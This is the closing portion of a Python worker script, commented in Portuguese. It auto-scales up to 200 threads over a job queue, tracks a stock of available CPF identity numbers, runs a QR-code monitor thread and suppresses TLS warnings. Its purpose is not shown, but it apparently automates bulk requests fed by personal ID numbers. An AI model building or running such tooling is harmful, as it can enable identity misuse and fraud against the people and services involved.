    print(f"  CPFs: {cpf_stats['available']} disponíveis")
    print(f"{C}{B}{'═'*50}{W}\n")

    import urllib3
    urllib3.disable_warnings()

    MIN_THREADS = 5
    MAX_THREADS = 200
    SCALE_RATIO = 0.10  # 10% dos jobs na fila

    stop = threading.Event()
    threads = []
    _thread_counter = 0

    def _spawn_workers(n):
        nonlocal _thread_counter
        for _ in range(n):
            t = threading.Thread(target=worker_loop, args=(stop,), daemon=True, name=f"worker-{_thread_counter}")
            t.start()
            threads.append(t)
            _thread_counter += 1

    # Inicia com num_threads (config/cli)
    _spawn_workers(max(num_threads, MIN_THREADS))

    # QR monitor background thread
    qr_t = threading.Thread(target=_qr_monitor_loop, args=(stop,), daemon=True, name="qr-monitor")
    qr_t.start()
    print(f"  {G}QR monitor thread iniciada{W}")

    try:
        while True:
            time.sleep(5)
            s = db.get_stats()
            q, p, ok, f = s["queued"], s["processing"], s["success"], s["failed"]
            total_jobs = q + p
            target = max(MIN_THREADS, min(MAX_THREADS, int(total_jobs * SCALE_RATIO)))

            # Limpar threads mortas
            threads = [t for t in threads if t.is_alive()]
            active = len(threads)

            # Escalar pra cima se precisa
            if active < target:
                to_add = target - active
                _spawn_workers(to_add)
                print(f"  {G}[scale] +{to_add} threads (total: {active + to_add} | fila: {q} proc: {p}){W}")

            print(f"  {D}[status] fila={q} | proc={p} | ok={G}{ok}{D} | fail={R}{f}{D} | threads={C}{len(threads)}{D}{W}", end="\r")
    except KeyboardInterrupt:
        print(f"\n{Y}Parando workers...{W}")
        stop.set()
        for t in threads:
            t.join(timeout=5)
        print(f"{G}Worker parado.{W}")


if __name__ == "__main__":
    main()
